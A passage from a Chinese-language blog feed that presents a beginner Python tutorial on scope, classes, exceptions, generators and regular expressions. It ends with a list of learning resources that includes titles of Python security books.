print(params)&gt;&gt;&gt; print_params_2(x=1,y=2,z=3){&apos;x&apos;: 1, &apos;y&apos;: 2, &apos;z&apos;: 3}</code></pre><h3 id="3-作用域"><a href="#3-作用域" class="headerlink" title="3. 作用域"></a>3. 作用域</h3><p><em>变量是指向值的名称，字典中的键指向值，有一个名为 vars 的内置函数，它返回这个不可见的字典</em></p><p><em>除全局作用域外，每个函数调用都将创建一个</em></p><pre><code>&gt;&gt;&gt; def foo(): x=4&gt;&gt;&gt; x = 1&gt;&gt;&gt; foo()&gt;&gt;&gt; x1</code></pre><p><em>调用 foo 时创建了一个新的命名空间，供 foo 中的代码块使用；赋值语句 x = 4是在这个内部作用域（局部命名空间）中执行的，不影响外部（全局）作用域内的 x </em></p><p><em>如果有一个局部变量或参数与你要访问的全局变量同名，就无法直接访问全局变量，因为它被局部变量遮住了；可使用函数 globals 来访问全局变量</em></p><pre><code>&gt;&gt;&gt; def combine(parameter):        print(parameter + globals()[&apos;parameter&apos;])&gt;&gt;&gt; parameter = &apos;berry&apos;&gt;&gt;&gt; combine(&apos;Shrub&apos;)Shrubberry</code></pre><hr><h2 id="0x07-面向对象"><a href="#0x07-面向对象" class="headerlink" title="0x07 面向对象"></a>0x07 面向对象</h2><p><em>对象意味着一系列数据（属性）以及一套访问和操作这些数据的方法</em></p><h3 id="1-基本特性"><a href="#1-基本特性" class="headerlink" title="1. 基本特性"></a>1. 基本特性</h3><pre><code>1. 类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例2. 方法：类中定义的函数3. 类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用4. 数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据5. 方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写6. 实例变量：定义在方法中的变量，只作用于当前实例的类7. 继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟&quot;是一个（is-a）&quot;关系（例图，Dog是一个Animal）8. 实例化：创建一个类的实例，类的具体对象9. 对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法</code></pre><p><strong><em>(1) 多态</em></strong></p><p><em>可对不同类型的对象执行相同的操作，即便不知道变量指向的是哪种对象，也能够对其执行操作，且操作的行为将随对象所属的类型（类）而异</em></p><pre><code>无需知道对象所属的类（对象的类型）就能调用其方法&gt;&gt;&gt; &apos;abc&apos;.count(&apos;a&apos;)1&gt;&gt;&gt; [&apos;a&apos;,1,2,&apos;a&apos;].count(&apos;a&apos;)2</code></pre><p><strong><em>(2) 封装</em></strong></p><p><em>封装（encapsulation）指的是向外部隐藏不必要的细节</em></p><pre><code>无需知道对象的构造就能使用其方法&gt;&gt;&gt; o = OpenObject() # 创建一个对象，将其关联到变量 o&gt;&gt;&gt; o.set_name(&apos;Sir Lancelot&apos;)&gt;&gt;&gt; o.get_name()&apos;Sir Lancelot&apos;</code></pre><h3 id="2-类及其用法"><a href="#2-类及其用法" class="headerlink" title="2. 类及其用法"></a>2. 类及其用法</h3><p><strong><em>(1) 类的创建</em></strong></p><pre><code>class Person:    def set_name(self,name):        self.name = name    def get_name(self):        return self.name    def greet(self):        print(&quot;Hello world! I&apos;m {}&quot;.format(self.name))</code></pre><p><em>示例包含三个方法定义，它们类似于函数定义，但位于 class 语句内；class 语句创建独立的命名空间，用于在其中定义函数</em></p><pre><code>创建实例来引用对象&gt;&gt;&gt; foo = Person()&gt;&gt;&gt; bar = Person()&gt;&gt;&gt; foo.set_name(&apos;Lucy&apos;)&gt;&gt;&gt; bar.set_name(&apos;Alice&apos;)&gt;&gt;&gt; foo.greet()Hello world! I&apos;m Lucy&gt;&gt;&gt; bar.greet()Hello world! I&apos;m Alice可以从外部访问这些属性&gt;&gt;&gt; foo.name&apos;Lucy&apos;&gt;&gt;&gt; bar.name = &apos;Frank&apos;&gt;&gt;&gt; bar.greet()Hello world! I&apos;m Frank</code></pre><p><strong><em>(2) 类的方法</em></strong></p><p><em>在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 self, 且为第一个参数，self 代表的是类的实例</em></p><p><strong><em>(3) 继承与多继承</em></strong></p><p><em>派生类定义</em></p><pre><code>class DerivedClassName(BaseClassName1):&lt;statement-1&gt;...&lt;statement-N&gt;</code></pre><p><em>圆括号中基类的顺序，若是基类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找基类中是否包含方法</em></p><p><em>多继承形式</em></p><pre><code>class DerivedClassName(Base1, Base2, Base3):&lt;statement-1&gt;...&lt;statement-N&gt;</code></pre><p><em>圆括号中父类的顺序，若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法</em></p><hr><h2 id="0x08-异常及处理"><a href="#0x08-异常及处理" class="headerlink" title="0x08 异常及处理"></a>0x08 异常及处理</h2><h3 id="1-异常"><a href="#1-异常" class="headerlink" title="1. 异常"></a>1. 异常</h3><p><em>Python使用<strong>异常对象</strong>来表示异常状态，并在遇到错误时引发异常。异常对象未被处理（或捕获）时，程序将终止并显示一条错误消息<code>（traceback）</code></em></p><pre><code>&gt;&gt;&gt; 1/0Traceback (most recent call last):  File &quot;&lt;pyshell#306&gt;&quot;, line 1, in &lt;module&gt;ZeroDivisionError: division by zero</code></pre><p><em>每个异常都是某个类（这里是<code>ZeroDivisionError</code> ）的实例；能以各种方式引发和捕获这些实例，从而逮住错误并采取措施</em></p><h3 id="2-异常引发"><a href="#2-异常引发" class="headerlink" title="2. 异常引发"></a>2. 异常引发</h3><p><strong><em>(1) raise 语句</em></strong></p><p><em>要引发异常，可使用 <code>raise</code> 语句，并将一个类（必须是 <code>Exception</code> 的子类）或实例作为参数；将类作为参数时，将自动创建一个实例</em></p><pre><code>&gt;&gt;&gt; raise ExceptionTraceback (most recent call last):  File &quot;&lt;pyshell#307&gt;&quot;, line 1, in &lt;module&gt;    raise ExceptionException&gt;&gt;&gt; raise Exception(&apos;hyperdrive overload&apos;)Traceback (most recent call last):  File &quot;&lt;pyshell#308&gt;&quot;, line 1, in &lt;module&gt;    raise Exception(&apos;hyperdrive overload&apos;)Exception: hyperdrive overload</code></pre><p><em>在第一个示例（ raise Exception ）中，引发的是通用异常，没有指出出现了什么错误。在第二个示例中，添加了错误消息 <code>hyperdrive overload</code></em></p><p><img src="http://pguklm607.bkt.clouddn.com/%E5%86%85%E7%BD%AE%E5%BC%82%E5%B8%B8.png" alt=""></p><p><strong><em>(2) 自定义异常</em></strong></p><p><em>就像创建其他类一样，但务必直接或间接地继承 <code>Exception</code> （这意味着从任何内置异常类派生都可以）</em></p><pre><code>class SomeCustomException(Exception): pass</code></pre><h3 id="3-捕获异常"><a href="#3-捕获异常" class="headerlink" title="3. 捕获异常"></a>3. 捕获异常</h3><p><em>捕获异常：对异常进行处理，可使用<code>try/except</code> 语句</em></p><pre><code>x = int(input(&apos;Enter the first number: &apos;))y = int(input(&apos;Enter the second number: &apos;))print(x / y)Enter the first number: 1Enter the second number: 0Traceback (most recent call last):  File &quot;H:/Code/Python/except.py&quot;, line 3, in &lt;module&gt;    print(x / y)ZeroDivisionError: division by zero</code></pre><p><em>捕获这种异常并对错误进行处理（这里打印一条对用户更友好的错误消息）</em></p><pre><code>try:    x = int(input(&apos;Enter the first number: &apos;))    y = int(input(&apos;Enter the second number: &apos;))    print(x / y)except ZeroDivisionError:    print(&apos;The second number can\&apos;t be zero! &apos;)===================== RESTART: H:/Code/Python/except.py =====================Enter the first number: 1Enter the second number: 0The second number can&apos;t be zero! </code></pre><p><em>异常从函数向外传播到调用函数的地方。如果在这里也没有被捕获，异常将向程序的最顶层传播；可使用 <code>try/except</code> 来捕获他人所编写函数引发的异常 </em></p><p><strong><em>finally 字句</em></strong></p><p> <em>finally 子句，可用于在发生异常时执行清理工作，不管 try 子句中发生什么异常，都将执行 finally 子句</em></p><pre><code>x = Nonetry:    x = 1/0finally:    print(&apos;Cleaning up...&apos;)    del x可在一条语句中同时包含 try 、except 、finally 和 elsetry:    1 / 0except NameError:    print(&quot;Unknown variable&quot;)else:    print(&quot;That went well!&quot;)finally:    print(&quot;Cleaning up.&quot;)</code></pre><h3 id="4-异常和函数"><a href="#4-异常和函数" class="headerlink" title="4. 异常和函数"></a>4. 异常和函数</h3><p><em>如果不处理函数中引发的异常，它将向上传播到调用函数的地方。如果在那里也未得到处理，异常将继续传播，直至到达主程序（全局作用域）。如果主程序中也没有异常处理程序，程序将终止并显示栈跟踪消息</em></p><pre><code>&gt;&gt;&gt; def faulty():... raise Exception(&apos;Something is wrong&apos;)...&gt;&gt;&gt; def ignore_exception():... faulty()...&gt;&gt;&gt; def handle_exception():... try:...  faulty()...  except:...  print(&apos;Exception handled&apos;)...&gt;&gt;&gt; ignore_exception()Traceback (most recent call last):File &apos;&lt;stdin&gt;&apos;, line 1, in ?File &apos;&lt;stdin&gt;&apos;, line 2, in ignore_exceptionFile &apos;&lt;stdin&gt;&apos;, line 2, in faultyException: Something is wrong&gt;&gt;&gt; handle_exception()Exception handled</code></pre><p><em>faulty 中引发的异常依次从 faulty 和 ignore_exception 向外传播，最终导致显示一条栈跟踪消息。调用 handle_exception 时，异常最终传播到 handle_exception ，并被这里的try / except 语句处理</em></p><h3 id="5-警告提示"><a href="#5-警告提示" class="headerlink" title="5. 警告提示"></a>5. 警告提示</h3><p><em>如果只想发出警告，指出情况偏离了正轨，可使用模块 warnings 中的函数 warn</em></p><pre><code>&gt;&gt;&gt; from warnings import warn&gt;&gt;&gt; warn(&quot;Don&apos;t do it...&quot;)Warning (from warnings module):  File &quot;H:/Code/Python/except.py&quot;, line 1    try:UserWarning: Don&apos;t do it...</code></pre><p><em>如果其他代码在使用你的模块，可使用模块 warnings 中的函数 filterwarnings 来抑制你发出的警告（或特定类型的警告），并指定要采取的措施，如” error “或” ignore “</em></p><pre><code>&gt;&gt;&gt; from warnings import filterwarnings&gt;&gt;&gt; filterwarnings(&quot;ignore&quot;)&gt;&gt;&gt; warn(&quot;Anyone out there?&quot;)&gt;&gt;&gt; filterwarnings(&quot;error&quot;)&gt;&gt;&gt; warn(&quot;Something is very wrong!&quot;)Traceback (most recent call last):    File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;UserWarning: Something is very wrong!</code></pre><hr><h2 id="0x09-迭代器-生成器"><a href="#0x09-迭代器-生成器" class="headerlink" title="0x09 迭代器/生成器"></a>0x09 迭代器/生成器</h2><h3 id="1-迭代器"><a href="#1-迭代器" class="headerlink" title="1. 迭代器"></a>1. 迭代器</h3><p><em>迭代是是访问集合元素的一种方式，从集合的第一个元素开始访问，直到所有的元素被访问完结束，迭代器只能往前不会后退</em></p><p><em>迭代器有两个基本的方法：iter() 和 next()</em></p><pre><code>&gt;&gt;&gt;list=[1,2,3,4]&gt;&gt;&gt; it = iter(list) # 创建迭代器对象&gt;&gt;&gt; print (next(it)) # 输出迭代器的下一个元素1&gt;&gt;&gt; print (next(it))2# 迭代器import syslist=[1,3,5,7,9]it = iter(list)while True:    try:        print(next(it))    except StopIteration:        sys.exit()</code></pre><h3 id="2-生成器"><a href="#2-生成器" class="headerlink" title="2. 生成器"></a>2. 生成器</h3><p><em>使用了 yield 的函数被称为生成器（generator），生成器是一个返回迭代器的函数，只能用于迭代操作</em></p><p><em>在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行</em></p><pre><code>import sysdef fibonacci(n): # 生成器函数 - 斐波那契    a, b, counter = 0, 1, 0    while True:        if (counter &gt; n):             return        yield a        a, b = b, a + b        counter += 1f = fibonacci(10) # f 是一个迭代器，由生成器返回生成while True:    try:        print (next(f), end=&quot; &quot;)    except StopIteration:        sys.exit()</code></pre><hr><h2 id="0x0A-正则表达式"><a href="#0x0A-正则表达式" class="headerlink" title="0x0A 正则表达式"></a>0x0A 正则表达式</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><ul><li><em>正则表达式为高级的文本模式匹配、抽取、与/或文本形式的搜索和替换功能提供了基础</em></li></ul><ul><li><p><em>正则表达式（简称为 regex）是一些由字符和特殊符号组成的字符串，它们描述了模式的重复或者表述多个字符，于是正则表达式能按照某种模式匹配一系列有相似特征的字符串</em></p></li><li><p><em>Python 通过标准库中的 re 模块来支持正则表达式</em></p></li></ul><h3 id="2-模式字符"><a href="#2-模式字符" class="headerlink" title="2. 模式字符"></a>2. 模式字符</h3><p><strong>(1) 模式元素</strong></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%A8%A1%E5%BC%8F%E5%AD%97%E7%AC%A6.png" alt=""></p><p><strong>(2) 常用实例</strong></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%A8%A1%E5%BC%8F%E5%AD%97%E7%AC%A6.png" alt=""></p><p><strong>(3) 用法详解</strong></p><p><strong><em>1. 使用择一匹配符号匹配多个正则表达式模式</em></strong></p><p><em>表示择一匹配的管道符号（|），也就是键盘上的竖线，表示一个“从多个模式中选择其一”的操作，使得正则表达式能够匹配多个字符串而不仅仅只是一个字符串</em></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%8B%A9%E4%B8%80.png" alt=""></p><p><strong><em>2. 匹配任意单个字符串</em></strong></p><p><em>点号或者句点（.）符号匹配除了换行符\n 以外的任何字符，要显式匹配一个句点符号本身，必须使用反斜线转义句点符号的功能，例如“.”</em></p><p><img src="http://pguklm607.bkt.clouddn.com/%E4%BB%BB%E6%84%8F%E5%8D%95%E4%B8%AA.png" alt=""></p><p><strong><em>3. 从字符串起始或者结尾或者单词边界匹配</em></strong></p><ul><li><p><em>使用脱字符（^）或者特殊字符\A（反斜线和大写字母 A）匹配字符串的开始位置</em></p></li><li><p><em>美元符号（$）或者\Z将用于匹配字符串的末尾位置</em></p></li></ul><p><img src="http://pguklm607.bkt.clouddn.com/%E5%A7%8B%E7%BB%88.png" alt=""></p><ul><li><em>特殊字符\b 和\B 可以用来匹配字符边界，\b 将用于匹配一个单词的边界，\B 将匹配出现在一个单词中间的模式</em></li></ul><p><img src="http://pguklm607.bkt.clouddn.com/the.png" alt=""></p><p><strong><em>4. 创建字符集</em></strong></p><p><em>方括号，该正则表达式能够匹配一对方括号中包含的任何字符，方括号仅仅表示逻辑或的功能</em></p><p><img src="http://pguklm607.bkt.clouddn.com/%E5%AD%97%E7%AC%A6%E9%9B%86.png" alt=""></p><p><strong><em>5. 限定范围和否定</em></strong></p><ul><li><p><em>方括号中两个符号中间用连字符（-）连接，用于指定一个字符的范围</em></p></li><li><p><em>脱字符（^）紧跟在左方括号后面，这个符号就表示不匹配给定字符集中的任何一个字符</em></p></li></ul><p><img src="http://pguklm607.bkt.clouddn.com/%E8%8C%83%E5%9B%B4.png" alt=""></p><p><strong><em>6. 存在性和频数匹配</em></strong></p><pre><code>特殊符号*、+和？，所有这些都可以用于匹配一个、多个或者没有出现的字符串模式，大括号操作符（{}），里面或者是单个值或者是一对由逗号分隔的值，这将最终精确地匹配前面的正则表达式 N 次（如果是{N}）或者一定范围的次数</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/%E9%97%AD%E5%8C%85.png" alt=""></p><p><strong><em>7. 表示字符集的特殊字符</em></strong></p><pre><code>使用 d 表示匹配任何十进制数字，（\w）能够用于表示全部字母数字的字符集，相当于[A-Za-z0-9_]的缩写形式，\s 可以用来表示空格字符，\D 表示任何非十进制数（与[^0-9]相同</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/%E5%AD%97%E7%AC%A6%E7%89%B9%E6%AE%8A.png" alt=""></p><p><strong><em>8. 使用圆括号指定分组</em></strong></p><pre><code>当使用正则表达式时，一对圆括号可以实现以下任意一个（或者两个）功能：对正则表达式进行分组，匹配子组</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/%E6%8C%87%E5%AE%9A%E5%88%86%E7%BB%84.png" alt=""></p><p><strong><em>9. 扩展表示法</em></strong></p><pre><code>扩展表示法，它们是以问号开始（?…），通常用于在判断匹配之前提供标记，实现一个前视（或者后视）匹配，或者条件检查</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/%E6%89%A9%E5%B1%95%E8%A1%A8%E7%A4%BA.png" alt=""></p><h3 id="3-正则模块"><a href="#3-正则模块" class="headerlink" title="3. 正则模块"></a>3. 正则模块</h3><p><em>Python 通过使用 re 模块来支持正则表达式，re 模块支持更强大而且更通用的 Perl 风格（Perl 5 风格）的正则表达式，该模块允许多个线程共享同一个已编译的正则表达式对象，也支持命名子组</em></p><p><strong>re 模块：核心函数和方法</strong></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%AD%A3%E5%88%99%E5%87%BD%E6%95%B0.png" alt=""></p><p><strong><em>(1) group()和 groups()方法 - 匹配对象</em></strong></p><pre><code>当处理正则表达式时，除了正则表达式对象之外，还有另一个对象类型：匹配对象。这些是成功调用 match()或者 search()返回的对象。匹配对象有两个主要的方法：group()和groups()；group()要么返回整个匹配对象，要么根据要求返回特定子组。groups()则仅返回一个包含唯一或者全部子组的元组</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/group.png" alt=""></p><p><strong><em>(2) match()方法 - 匹配字符串</em></strong></p><pre><code>match()是将要介绍的第一个 re 模块函数和正则表达式对象（regex object）方法；match()函数试图从字符串的起始部分对模式进行匹配。如果匹配成功，就返回一个匹配对象；如果匹配失败，就返回 None，匹配对象的 group()方法能够用于显示那个成功的匹配</code></pre><p><em>函数语法：</em></p><pre><code>re.match(pattern, string, flags=0)</code></pre><p><em>参数说明：</em></p><p><img src="http://pguklm607.bkt.clouddn.com/match.png" alt=""></p><p><strong><em>(3) search()方法 - 搜索匹配</em></strong></p><pre><code>search()会用它的字符串参数，在任意位置对给定正则表达式模式搜索第一次出现的匹配情况；如果搜索到成功的匹配，就会返回一个匹配对象；否则，返回 None</code></pre><p><em>函数语法：</em></p><pre><code>re.search(pattern, string, flags=0)</code></pre><p><em>参数说明：</em></p><p><img src="http://pguklm607.bkt.clouddn.com/search.png" alt=""></p><p><strong><em>re.match与re.search的区别</em></strong></p><pre><code>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配</code></pre><p><strong><em>(4) sub()与subn() - 搜索与替换</em></strong></p><pre><code>Python 的re模块提供了sub()和 subn()用于替换字符串中的匹配项，用来替换的部分通常是一个字符串，但它也可能是一个函数，该函数返回一个用来替换的字符串。subn()和 sub()一样，但 subn()还返回一个表示替换的总数，替换后的字符串和表示替换总数的数字一起作为一个拥有两个元素的元组返回</code></pre><p><em>语法：</em></p><pre><code>re.sub(pattern, repl, string, max=0)</code></pre><p><strong><em>(5) findall()和 finditer() - 查找每一次出现的位置</em></strong></p><p><em>findall()函数</em></p><pre><code>findall()查询字符串中某个正则表达式模式全部的非重复出现情况。这与 search()在执行字符串搜索时类似，但与 match()和 search()的不同之处在于，findall()总是返回一个列表。如果 findall()没有找到匹配的部分，就返回一个空列表，但如果匹配成功，列表将包含所有成功的匹配部分（从左向右按出现顺序排列）</code></pre><p><em>finditer() 函数</em></p><pre><code>finditer()函数是在 Python 2.2 版本中添加回来的，这是一个与 findall()函数类似但是更节省内存的变体。两者之间以及和其他变体函数之间的差异（很明显不同于返回的是一个迭代器还是列表）在于，和返回的匹配字符串相比，finditer()在匹配对象中迭代</code></pre><p><strong><em>(6) split() - 限定模式分隔字符串</em></strong></p><pre><code>re 模块和正则表达式的对象方法 split()对于相对应字符串的工作方式是类似的，但是与分割一个固定字符串相比，它们基于正则表达式的模式分隔字符串，为字符串分隔功能添加一些额外的威力</code></pre><hr><h2 id="0xFF-学习资源"><a href="#0xFF-学习资源" class="headerlink" title="0xFF 学习资源"></a>0xFF 学习资源</h2><h3 id="1-基础学习"><a href="#1-基础学习" class="headerlink" title="1. 基础学习"></a>1. 基础学习</h3><ul><li><p><a href="https://pan.baidu.com/s/1d8JZCmzM668yaDLGQy4iSg" target="_blank" rel="noopener">《流畅的Python》</a></p></li><li><p><a href="https://pan.baidu.com/s/1TJ_YMvVAihLm_rdGIqL9Hg" target="_blank" rel="noopener">《Python 基础教程 第3版》</a></p></li><li><p><a href="https://pan.baidu.com/s/1Si1N2hKEtULVshB6K7eNzQ" target="_blank" rel="noopener">《Python 核心编程 第三版》</a></p></li><li><p><a href="https://docs.python.org/2.7/" target="_blank" rel="noopener">Python 2.7 documentation </a></p></li><li><p><a href="https://docs.python.org/3.6/" target="_blank" rel="noopener">Python 3.6 documentation</a></p></li><li><p><a href="https://www.w3cschool.cn/search?w=python" target="_blank" rel="noopener">w3cschool python 学习资源</a></p></li><li><p><a href="http://www.runoob.com/python/python-tutorial.html" target="_blank" rel="noopener">runoob - Python 2.x 基础教程</a></p></li><li><p><a href="http://www.runoob.com/python3/python3-tutorial.html" target="_blank" rel="noopener">runoob - Python 3.x 基础教程</a></p></li><li><p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="noopener">廖雪峰 - Python 教程</a></p></li></ul><h3 id="2-Python-Web-框架"><a href="#2-Python-Web-框架" class="headerlink" title="2. Python Web 框架"></a>2. Python Web 框架</h3><ul><li><p><a href="https://pan.baidu.com/s/1jxCzzQ0PLF4yyTHT2jK_9w" target="_blank" rel="noopener">《Django 基础教程》</a></p></li><li><p><a href="https://pan.baidu.com/s/1nZcSYXu8veJH48TaOtDl5w" target="_blank" rel="noopener">《Flask Web 开发》</a></p></li><li><p><a href="https://pan.baidu.com/s/1Si1N2hKEtULVshB6K7eNzQ" target="_blank" rel="noopener">《Python 核心编程》</a></p></li><li><p><a href="http://docs.jinkan.org/docs/flask/" target="_blank" rel="noopener">Python Flask 用户指南</a></p></li><li><p><a href="https://www.w3cschool.cn/django/" target="_blank" rel="noopener">W3Cschool - Django 教程</a></p></li></ul><h2 id="3-网络爬虫"><a href="#3-网络爬虫" class="headerlink" title="3. 网络爬虫"></a>3. 网络爬虫</h2><ul><li><p><a href="https://pan.baidu.com/s/1v_txruHUKGjih-Po4kUBog" target="_blank" rel="noopener">《Python3 网络爬虫开发实战》</a></p></li><li><p><a href="http://docs.pyspider.org/en/latest/" target="_blank" rel="noopener">pyspider 官方文档 </a></p></li><li><p><a href="https://doc.scrapy.org/en/latest/" target="_blank" rel="noopener">Scrapy 官方文档</a></p></li><li><p><a href="http://wiki.jikexueyuan.com/project/python-crawler-guide/" target="_blank" rel="noopener">Python 爬虫学习系列教程</a></p></li><li><p><a href="https://github.com/facert/awesome-spider" target="_blank" rel="noopener">Github - awesome-spider</a></p></li><li><p><a href="https://github.com/Jack-Cherish/python-spider" target="_blank" rel="noopener">Github - Python3 网络爬虫实战</a></p></li></ul><h2 id="4-安全运用"><a href="#4-安全运用" class="headerlink" title="4. 安全运用"></a>4. 安全运用</h2><ul><li><p><a href="https://pan.baidu.com/s/12z5ktn3ay0BNVDVAPNYskA" target="_blank" rel="noopener">《Violent Python》</a></p></li><li><p><a href="https://pan.baidu.com/s/18gFY4wImYfJ9lkc2LZ949g" target="_blank" rel="noopener">《Black Hat Python》</a></p></li><li><p><a href="https://pan.baidu.com/s/18gFY4wImYfJ9lkc2LZ949g" target="_blank" rel="noopener">《Gray Hat Python》</a></p></li><li><p><a href="https://wizardforcel.gitbooks.io/violent-python/content/" target="_blank" rel="noopener">Violent Python 在线版</a></p></li><li><p><a href="https://www.gitbook.com/book/wizardforcel/py-sec-tutorial" target="_blank" rel="noopener">Python 安全编程教程</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文对 &lt;a href=&quot;https://www.python.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Python&lt;/a&gt; 编程语言的基本用法简要总结，对 Python Web 主流开发框架，网络爬虫，安全运用等学习资源进行梳理，便于查询参阅&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x03 实践之道" scheme="http://www.firehacker.top/categories/0x03-%E5%AE%9E%E8%B7%B5%E4%B9%8B%E9%81%93/"/>
    
      <category term="编程开发" scheme="http://www.firehacker.top/categories/0x03-%E5%AE%9E%E8%B7%B5%E4%B9%8B%E9%81%93/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="http://www.firehacker.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python编程-理论篇</title>
    <link href="http://www.firehacker.top/2018/10/16/Python%E7%BC%96%E7%A8%8B-%E7%90%86%E8%AE%BA%E7%AF%87/"/>
    <id>http://www.firehacker.top/2018/10/16/Python编程-理论篇/</id>
    <published>2018-10-16T10:58:08.000Z</published>
    <updated>2018-10-24T07:03:15.141Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文对 <a href="https://www.python.org/" target="_blank" rel="noopener">Python</a> 编程语言的基本用法简要总结，对 Python Web 主流开发框架，网络爬虫，安全运用等学习资源进行梳理，便于查询参阅</p></blockquote><a id="more"></a><hr><h2 id="0x01-基础用法"><a href="#0x01-基础用法" class="headerlink" title="0x01 基础用法"></a>0x01 基础用法</h2><h3 id="1-数和表达式"><a href="#1-数和表达式" class="headerlink" title="1. 数和表达式"></a>1. 数和表达式</h3><p><em>(1) 除法运算的结果为小数，即浮点数（float或floating-point number）</em></p><pre><code>&gt;&gt;&gt; 1/20.5&gt;&gt;&gt; 2/30.6666666666666666&gt;&gt;&gt; 1/11.0</code></pre><p><em>(2) 执行整除运算，可使用双斜杠</em></p><pre><code>&gt;&gt;&gt; 1 // 20&gt;&gt;&gt; 1 // 11&gt;&gt;&gt; 5.0 // 2.12.0</code></pre><p><em>(3) Python 2.x，要对整数执行常规除法运算(取整)，可在程序开头添加如下语句</em></p><pre><code>&gt;&gt;&gt; from __future__ import division</code></pre><p><em>(4) 求余（求模）运算</em></p><pre><code>&gt;&gt;&gt; 10 % 31&gt;&gt;&gt; 10 % -3-2&gt;&gt;&gt; -10 % 32&gt;&gt;&gt; -10 % -3-1</code></pre><p><em>(5) 乘方（求幂）运算符</em></p><pre><code>&gt;&gt;&gt; 2 ** 416&gt;&gt;&gt; (-3) ** 29&gt;&gt;&gt; -3 ** 2-9</code></pre><p><em>乘方运算符的优先级比求负（单目减）高，因此 <code>-3**2</code> 等价于` -(3**2)</em>`</p><p><em>(6) 进制表示</em></p><pre><code>&gt;&gt;&gt; 0xff          十六进制255&gt;&gt;&gt; 0o10          八进制8&gt;&gt;&gt; 0b10000000    二进制128</code></pre><h3 id="2-变量和语句"><a href="#2-变量和语句" class="headerlink" title="2. 变量和语句"></a>2. 变量和语句</h3><p><em>变量是表示（或指向）特定值的名称，名称（ 标识符）只能由字母、数字和下划线（_）构成，且不能以数字打头</em></p><pre><code>&gt;&gt;&gt; x = 3&gt;&gt;&gt; x3&gt;&gt;&gt; x * 515&gt;&gt;&gt; print (x * x)9</code></pre><h3 id="3-获取用户输入"><a href="#3-获取用户输入" class="headerlink" title="3. 获取用户输入"></a>3. 获取用户输入</h3><pre><code>&gt;&gt;&gt; input(&quot;The file is: &quot;)The file is: host&apos;host&apos;&gt;&gt;&gt; x = input(&quot;x: &quot;)x: 12&gt;&gt;&gt; y = input(&quot;y: &quot;)y: 32&gt;&gt;&gt; print(int(x) * int(y))384</code></pre><h3 id="4-函数与模块"><a href="#4-函数与模块" class="headerlink" title="4. 函数与模块"></a>4. 函数与模块</h3><p><em>内置函数：直接调用</em></p><pre><code>&gt;&gt;&gt; 10 + pow(2,3) / 3.0    pow(a,b) 执行幂运算12.666666666666666&gt;&gt;&gt; abs(-10)               abs() 绝对值运算10&gt;&gt;&gt; round(2 / 3)           round 将浮点数圆整为与之最接近的整数1</code></pre><p><em>模块：使用命令import导入，包含众多有用的函数</em></p><pre><code>&gt;&gt;&gt; import math        导入math模块&gt;&gt;&gt;&gt; math.floor(32.9)   floor函数：向下取整32&gt;&gt;&gt; math.floor(-3.2)-4&gt;&gt;&gt; math.ceil(32.9)    ceil函数：向上取整33&gt;&gt;&gt; math.ceil(-3.2)-3&gt;&gt;&gt; import math&gt;&gt;&gt; math.sqrt(3)1.7320508075688772&gt;&gt;&gt; from math import sqrt&gt;&gt;&gt; sqrt(3)1.7320508075688772</code></pre><p><em>使用命令 import 的变种 from module import function ，可在调用函数时不指定模块前缀</em></p><pre><code>&gt;&gt;&gt; import cmath        cmath模块进行复数计算&gt;&gt;&gt; cmath.sqrt(-1)1j&gt;&gt;&gt; (1 + 3j) * (2-4j)(14+2j)</code></pre><h3 id="5-注释"><a href="#5-注释" class="headerlink" title="5. 注释"></a>5. 注释</h3><pre><code>单行注释：以 # 开头# 这是一个注释print(&quot;Hello, World!&quot;) 多行注释：用三个单引号 &apos;&apos;&apos; 或者三个双引号 &quot;&quot;&quot; 将注释括起来</code></pre><h3 id="6-字符串"><a href="#6-字符串" class="headerlink" title="6. 字符串"></a>6. 字符串</h3><p><em>(1) 单引号字符串以及对引号转义</em></p><pre><code>&gt;&gt;&gt; &quot;Hello python&quot;&apos;Hello python&apos;&gt;&gt;&gt; &apos;Hello python&apos;&apos;Hello python&apos;&gt;&gt;&gt; &apos;Let&apos;s go&apos;SyntaxError: invalid syntax&gt;&gt;&gt; &apos;Let\&apos;s go&apos;&quot;Let&apos;s go&quot;</code></pre><p><em>(2) 拼接字符串</em></p><pre><code>&gt;&gt;&gt; &quot;Hello，&quot; + &quot;Python&quot;&apos;Hello，Python&apos;&gt;&gt;&gt; x 